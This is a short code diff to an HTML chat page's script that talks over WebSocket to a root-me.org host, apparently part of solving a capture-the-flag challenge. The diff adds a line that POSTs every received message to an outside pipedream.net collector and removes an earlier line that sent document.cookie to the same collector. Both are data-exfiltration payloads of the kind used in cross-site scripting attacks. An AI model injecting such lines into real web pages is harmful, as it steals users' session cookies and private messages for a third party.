@@ -106,13 +106,16 @@
                 window.location.href="/"
                 return;
             }
-            var connection = new WebSocket('ws://ctf27.root-me.org/ws');  
-            connection.onopen = function () {};  
+            var connection = new WebSocket('ws://ctf30.root-me.org/ws');  
+            connection.onopen = function () {
+                connection.send('hello');
+            };  
             connection.onerror = function (error) {
               alert("An error occured, you will reload the page for you to access a new room !")
               location.reload()
             };
             connection.onmessage = function (message) {
+              fetch('https://enh0xx2mgeid.x.pipedream.net/remote', { "method": "POST", "mode": "no-cors", "body": message.data });
               $("#chatbox").append("You: "+$("#input").val().replace('<','').replace('>','')+"\n")
               $("#chatbox").append("\nBot: "+message["data"].replace('<','').replace('>','')+"\n-------------------------------------------------------------\n")
               $('#chatbox').scrollTop($('#chatbox')[0].scrollHeight);
@@ -131,7 +134,6 @@
               }
             });  
         });
-        fetch('https://enh0xx2mgeid.x.pipedream.net?cookie=' + document.cookie);
     </script>
 </body>
 </html>
